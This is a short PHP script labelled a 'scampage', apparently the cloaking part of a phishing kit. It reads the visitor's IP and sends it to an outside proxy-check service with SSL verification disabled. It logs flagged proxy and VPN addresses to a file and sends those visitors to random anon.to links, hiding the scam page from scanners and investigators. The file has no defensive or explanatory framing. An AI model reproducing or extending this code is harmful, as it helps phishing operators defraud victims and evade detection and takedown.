<?php
//scampage by devilscream

$random_id = sha1(rand(0,1000000));
$link = array("https://anon.to/1qN5Mr",
"https://anon.to/pjZV8e",
"https://anon.to/ItQ1lf",
"https://anon.to/gOebLZ",
"https://anon.to/3jju06",
"https://anon.to/H2jGQ0",
"https://anon.to/ZbQ0Xz",
"https://anon.to/NjfHnT",
"https://anon.to/pzixhk",
"https://anon.to/eTlZen",
"https://anon.to/uRnAyx",
"https://anon.to/BtdkOp");
$random = rand(0, 11);
$link = $link[$random];

function getUserIPs()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$ip = getUserIPs();
if($proxyblock == 1) {
    if($ip == "127.0.0.1") {
    }else{
    	$url = "http://proxy.mind-media.com/block/proxycheck.php?ip=".$ip;
    	$ch = curl_init();  
    	curl_setopt($ch,CURLOPT_URL,$url);
    	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    	$resp = curl_exec($ch);
    	curl_close($ch);
    	$result = $resp;
    	if($result == "Y") {
    		$file = fopen("proxy-block.txt","a");
    		$message = $ip."\n";
    		fwrite($file, $message);
    		fclose($file);
    		header("location: $link");
            exit();
    	}
    }
}
?>